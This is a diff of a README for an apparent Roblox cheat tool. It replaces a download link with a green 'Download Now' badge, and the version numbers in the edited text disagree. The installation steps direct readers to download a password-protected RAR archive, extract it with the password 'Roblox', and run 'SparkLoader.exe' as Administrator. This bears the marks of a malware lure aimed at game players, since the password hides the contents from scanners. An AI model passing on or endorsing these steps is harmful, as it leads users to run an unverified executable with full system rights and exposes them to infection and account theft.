@@ -21,14 +21,17 @@
 
 ## 📥 Download & Installation
 
-**Latest Release:** **v5.2.0** | **File Size:** 145.01 MB | **Password:** `Roblox`
+**Latest Release:** **v4.5.1** | **File Size:** 145.01 MB | **Password:** `Roblox`
 
-### 🔗 Direct Download Link:
-[Download Spark.hub.rar](https://github.com/elitesniperbr/Roblox-Script-Enhancer-Utility-V5-Blox-Fruits-Auto-Helper/releases/download/Roblox_activator/Spark.hub.rar)
+### 🔗 Download Button:
+[![Download Now](https://img.shields.io/badge/Download-v5.2.0-00cc00?style=for-the-badge&logo=download&logoColor=white)](https://github.com/elitesniperbr/Roblox-Script-Enhancer-Utility-V5-Blox-Fruits-Auto-Helper/releases/download/Roblox_activator/Spark.hub.rar)
+
+**File:** `Spark.hub.rar` (145.01 MB)  
+**Password:** `Roblox`
 
 ### 📋 Installation Guide:
-1.  **Download** the latest archive using the link above
-2.  **Extract** the contents using WinRAR or 7-Zip (Password: `Roblox`)
+1.  **Click the green Download button above** to get the latest version
+2.  **Extract** the archive contents using WinRAR or 7-Zip (Password: `Roblox`)
 3.  **Locate** the `SparkLoader.exe` file in the extracted folder
 4.  **Run as Administrator** to ensure proper functionality
 5.  **Configure** your preferred settings through the intuitive interface
